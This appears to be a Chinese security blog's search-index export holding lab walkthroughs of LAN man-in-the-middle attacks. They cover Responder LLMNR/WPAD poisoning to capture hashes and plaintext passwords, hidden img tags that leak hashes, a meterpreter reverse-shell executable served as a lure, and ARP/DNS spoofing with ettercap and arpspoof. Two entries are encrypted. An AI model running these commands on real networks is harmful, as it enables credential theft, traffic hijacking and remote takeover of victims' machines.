<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[中间人攻击————LLMNR以及Responder]]></title>
    <url>%2F2018%2F03%2F08%2Fspoof-llmnr-wpad%2F</url>
    <content type="text"><![CDATA[概述继续学习一波中间人攻击的LLMNR以及Responder，备忘。 概述Windows系列机子在局域网中查询DNS一般通过如下的几个步骤： 查看本地hosts文件。 1type C:\Windows\system32\drivers\etc\hosts 查询本地DNS缓存。 1ipconfig/displaydns 向dns服务器发送dns请求。 如果本地网络中的dns也解析失败,它就会被交给LLMNR[链路本地多播名称解析]和netbios-ns去处理解析。 LLMNR 以及 NetBIOS——NS从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议 —— LLMNR，主要用于局域网中的名称解析。在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析 (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或 mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS 服务器切断了子网，则支持 LLMNR 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。 LLMNR为使用IPv4、IPv6或者同时使用这两种地址的设备提供了点对点名称解析服务，LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于 DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。 LLMNR通过在DNS名称解析服务不可用时提供解析服务，弥补了DNS的不足。 LLMNR 和DNS一样，LLMNR 名称解析过程所使用的传输协议为 UDP 协议。其IPv4 的广播地址为 - 224.0.0.252, IPv6 的广播地址为 - FF02:0:0:0:0:0:1:3 或 FF02::1:3。在主机中所监听的端口为 UDP/5355。 使用 Wireshark 抓取一个完整的 LLMNR 质询/应答过程的数据包，如下图所示： 从上图可以看到，主机 A 分别使用自己的 IPv4 地址和 IPv6 地址向 IPv4 和 IPv6 的广播地址进行了广播。查询的地址类型为请求主机 B 的 IPv4 地址，这一点可以从 A 或 AAAA 进行区别。一个 A 表示请求的地址类型为 IPv4 地址，四个A（AAAA）表示请求的地址类型为 IPv6 地址。 NetbiosNetbios 即名称服务,专门用于同一内网下windows机器之间通过机器名相互访问,工作在会话层。NetBIOS是本地网络的系统API，它有三种NetBIOS服务： 域名服务，使用137端口用于域名注册和域名解析 数据分发服务，使用138端口连接通信 会话服务，使用139端口面向连接通信 在dns查询失败后，LLMNR会调用NetBIOS，生成一个NetBIOS-NS数据包然后使用广播的方式发送出去。 这个看似没什么坏处的协议，我们可以利用其进行中间人攻击从而获取敏感数据，如用户名，hash等。 劫持会话获取 HASH 劫持 SMB 会话获取 HASH 利用 LLMNR Poison 攻击劫持 SMB 会话与 SMBRelay 攻击相似，本质上都是对 SMB 的会话进行劫持，但是 SMBRelay 攻击是被动式的攻击，同时，攻击者所劫持的 SMB 会话只有在该会话本身是一次成功的会话的情况下才能拿到目标服务器的权限。利用 LLMNR Poison 攻击劫持 SMB 会话，只要有主机使用计算机名称访问其他主机的共享时就可以得到发起共享请求的主机的 HASH。但是这个 HASH 只能用于爆破（因为已知了挑战），无法直接登录主机。可以将 LLMNR Poison 攻击 与 SMBRelay 攻击结合起来，提升攻击力。 使用 HTTP 401 认证获取 HASH 使用 HTTP 401 认证同样也可以获取到客户端机器的 HASH。 攻击原理假设现在有三台机器： A 被欺骗主机： 192.168.111.170B 攻击机：192.168.111.183C 被欺骗主机要访问的服务器：192.168.111.1 当A向C发起共享资源请求时,由于本地dns解析失败,正常情况下该请求会被交给LLMNR然后执行netbios查询,但不巧的是攻击者此时正在监听网络中的所有netbios查询请求,自然也就会捕捉到这条查询,当攻击者捕捉到该查询之后,它会告请求者也就是A,我[B]就是你要请求的那台服务器,接着A会把自己的账号密码提供给B认证,也就是说,此时B已经截获到了A的账号密码。 具体操作 在C服务器上,也就是我们的服务器上先创建一个共享目录： 攻击机启动responder 此时,我们再利用responder 来获取目标的smb hash,虽然不是明文,但我们可以配合类似hashcat的hash破解工具尝试破解该hash,当然,如果你有自己的GPU矩阵就再好不过了,或许很快就可以拿到对应的明文 1root@kali:~# responder -I eth0 然后再回到A上通过smb进行访问： Kali 攻击机上可以看到如下hash值 WPADWPAD（web代理自动发现协议-Web Proxy Auto-Discovery Protocol），是客户端通过DHCP或DNS协议探测代理服务器配置脚本url的一种方式。当IE定位脚本并将脚本下载到本地之后，就可以通过该脚本来为不同的url选择相应的代理服务器。目前主流浏览器一般都支持WPAD。 只要应用于如下场景，公司内网为了安全，不允许员工直接访问外网的服务，但是允许公司员工通过web代理访问外网资源，但是对于员工来说设置代理又是个麻烦事，所以通常公司主要使用用WPAD来查找网络中的wpad.dat文件的,有了该文件以后,客户端以后就会根据文件中的内容自动配置代理。 查询wpad.dat文件主要通过如下几个方式： 通过dns查询。 通过dhcp服务进行检索。 利用LLMNR查询。 攻击原理可以利用dns或者dhcp毒化,来操控流量指向,但这种方式很容易被拦截,而LLMNR则不一样,它是通过广播告诉同一内网下的所有windows,它就是wpad服务器,这样当你的浏览器设置为自动检测代理设置的情况下,它就会下载攻击者事先准备好的wpad.dat文件,这样一来,客户端的流量就会经过攻击者的机器。 假设现在有三台机器： A 被欺骗主机： 192.168.111.170B 攻击机：192.168.111.183C 被欺骗主机要访问的服务器：192.168.111.156（desktop-9hmbf0） 具体操作 在C服务器上,也就是我们的服务器上先创建一个共享目录： 攻击机启动responder 1root@kali:~# responder -I eth0 -wFb 在被欺骗主机上开启自动检测脚本 被欺骗者访问主机目标服务器，并登陆 Kali 攻击机上可以看到如下明文密码 其他Responder 结合钓鱼页面/跨站进行伪造钓鱼页面或者借助跨站插入如下相关请求： 12&lt;img/src=\\orleven\1.jpg width=0 height=0&gt; &lt;img/src=http:\\orleven\1.jpg width=0 height=0&gt; responder 钓鱼木马 首先,准备好自己的马,这里我就暂时直接用msf来生成了，现实中免杀是必须的,生成好以后把它放到我们的responder的files目录中， 12root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.183 LPORT=1234 -f exe -o /root/Desktop/shell.exeroot@kali:~# mv /root/Desktop/shell.exe /usr/share/responder/files/ msf监听端口 12345use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.111.183 set LPORT 1234exploit -j 编辑responder.conf 1root@kali:~# vi /etc/responder/Responder.conf 12345Serve-Always = OnServe-Exe = On HtmlFilename = files/AccessDenied.htmlExeFilename = files/shell.exe 指定我们刚刚生成的shell名称ExeDownloadName = ProxyClient.exe 提示下载时所显示的名称,最好弄个成功率比较高的有诱惑性的名字 启动responder： 1root@kali:~# responder -I eth0 -wrf 等待被欺骗机访问任意域名，下载运行程序 kali成功控制。 参考文章(利用LLMNR协议进行常规win内网渗透的理解与实践)[https://klionsec.github.io/2016/07/23/llmnr-wpad/ ](利用 LLMNR 名称解析缺陷劫持内网指定主机会话)[http://drops.xmd5.com/static/drops/tips-11086.html ]]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>arpspoof</tag>
        <tag>dnsspoof</tag>
        <tag>responder</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中间人攻击————ARP毒化与DNS毒化]]></title>
    <url>%2F2018%2F02%2F28%2Farpspoof-dnsspoof%2F</url>
    <content type="text"><![CDATA[概述操作一波中间人攻击的ARP毒化与DNS欺骗，备忘。 准备测试机子如下 ： 攻击者：192.168.111.183被欺骗主机：192.168.111.173默认网关（_gateway）：192.168.111.2 ARP毒化查看arp表 1234root@kali:~# arpAddress HWtype HWaddress Flags Mask Iface192.168.111.254 ether 00:50:56:fe:53:af C eth0_gateway ether 00:50:56:e6:26:42 C eth0 开启转发 12345root@kali:~# cat /proc/sys/net/ipv4/ip_forward0root@kali:~# echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forwardroot@kali:~# cat /proc/sys/net/ipv4/ip_forward1 EttercapEttercap是一个多用途的开源工具，可以用来执行嗅探、密码抓取、主机分析等，并且还可以图形化启动。 另外ettercap有些不错的插件，可以增强中间人攻击。 12345dns_spoof (执行DNS欺骗攻击)Dos_attack(对受害主机进行拒绝服务攻击)Chk_poison(检测是否成功进行了攻击)Repoison_arp(顾名思义，修复ARP)...... 具体操作如下： 123root@kali:~# ettercap -G // 图形化启动ettercaproot@kali:~# ettercap -T -q -M ARP // 对所有主机进行ARP欺骗root@kali:~# ettercap -T -q -M ARP -A 192.168.111.173 // 对192.168.111.173进行欺骗 查看受害者主机的arp表会发现，网关的mac地址被替换成了攻击机的mac地址。 DsniffDsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如： 12345MsgsnarfUrlsnarfMailsnarfFilesnarfdnsspoof arpspoof重定向受害者的流量传送给攻击者。1234root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.2root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.20:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b90:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9...... arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）1234root@kali:~# arpspoof -i eth0 -t 192.168.111.2 192.168.111.1830:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b90:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b9...... 截获敏感信息12root@kali:~# driftnet -i eth0 // 截获图片root@kali:~# dsniff -i eth0 // 截获密码 DNS毒化DNS欺骗攻击是一种非常危险的中间人攻击，它容易被攻击者利用并且窃取用户的机密信息。使用DNS欺骗中间人攻击，攻击者将截取会话，然后转移到一个假网站的会话。假如：用户希望访问baidu.com，并且谷歌的IP地址为220.181.57.216，攻击者就可以使用DNS欺骗技术拦截会话，并将用户重定向到假冒的网站，假网站IP可以为任意IP。 Ettercapettercap包含一个DNS插件，可以进行DNS欺骗攻击。 在服务器上开启web服务。 查找编辑etter.dns文件，并在里面添加需要进行欺骗网站域名： 123root@kali:~# find / -name etter.dns/etc/ettercap/etter.dnsroot@kali:~# vim /etc/ettercap/etter.dns 比如将google.com的ip导向118.24.150.108 123google.com A 118.24.150.108 *.google.com A 118.24.150.108 www.google.com PTR 118.24.150.108 然后启动 1root@kali:~# ettercap -G 点击上方菜单的Sniff，选择Unified sniffing，并选择网卡。 点击上方菜单的Hosts，选择Scan for hosts，进行主机扫描。 点击上方菜单的Hosts，选择Hosts list，进行选择目标主机为target1，选择网关为target2。 点击上方菜单的Mitm，选择ARP Poisoning，然后勾选Sniff remote connections。 点击上方菜单的Plugins，选择Manage the plugins，然后勾选dns_spoof以及remote browser,当然还有其他插件，根据需求选择。 目标主机访问此域名google。 参考资料中间人攻击-ARP毒化中间人攻击-DNS毒化]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>arpspoof</tag>
        <tag>dnsspoof</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口渗透总结]]></title>
    <url>%2F2018%2F02%2F08%2Fport-pentest%2F</url>
    <content type="text"><![CDATA[本文章暂时加密，如有需要请联系本人。 ]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>pentest</tag>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>docker</tag>
        <tag>eternalBlue</tag>
        <tag>doublePulsar</tag>
        <tag>java unserialize</tag>
        <tag>weblogic</tag>
        <tag>jenkins</tag>
        <tag>information gathering</tag>
        <tag>mysql</tag>
        <tag>RFI</tag>
        <tag>LFI</tag>
        <tag>webshpere</tag>
        <tag>port</tag>
        <tag>intranet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计总结]]></title>
    <url>%2F2018%2F01%2F13%2Fcode-audit-summary%2F</url>
    <content type="text"><![CDATA[本文章暂时加密，如有需要请联系本人。 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